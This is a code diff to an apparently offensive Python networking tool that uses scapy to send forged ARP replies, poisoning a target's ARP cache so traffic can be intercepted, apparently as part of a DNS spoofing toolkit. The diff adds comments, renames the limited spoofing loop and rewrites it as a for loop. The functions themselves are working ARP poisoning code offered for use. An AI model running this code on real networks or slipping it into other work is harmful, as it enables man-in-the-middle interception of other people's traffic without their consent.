@@ -3,6 +3,7 @@ import shlex
 import threading
 import time
 
+# ARP spoofing
 def arp_spoof (target_ip, target_mac, spoofed_ip):
     packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
     sc.send(packet, verbose=False)
@@ -14,6 +15,7 @@ def arp_spoof_loop(ip, mac, iptospoof):
         time.sleep(2)
         print("Spoofing...")
 
+# Basic ARP poisoning function 
 def start_arp_poison(cmd):
     args = shlex.split(cmd)
     ip = mac = iptospoof = None
@@ -33,18 +35,21 @@ def start_arp_poison(cmd):
     arp_thread.daemon = True
     arp_thread.start()
 
+
+# Starts a thread that performs ARP spoofing sending a limited number of packets.
 def start_arp_thread(target_ip, mac, spoofed_ip, count):
-    arp_thread = threading.Thread(target=arp_for_dns_spoof_loop, args=(target_ip, mac, spoofed_ip, count))
+    arp_thread = threading.Thread(target=arp_limited_spoof_loop, args=(target_ip, mac, spoofed_ip, count))
     arp_thread.daemon = True
     arp_thread.start()
 
-def arp_for_dns_spoof_loop(ip, mac, spoofed_ip, count):
+# Performs ARP spoofing sending a limited number packets.
+def arp_limited_spoof_loop(ip, mac, spoofed_ip, count):
     print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-    i = 0
-    while i in range(count):
+    
+    for i in range(count):
         arp_spoof(ip, mac, spoofed_ip)
         time.sleep(1)
-        i+=1
+        
     print("ARP Poison to %s complete" % ip)
 
 
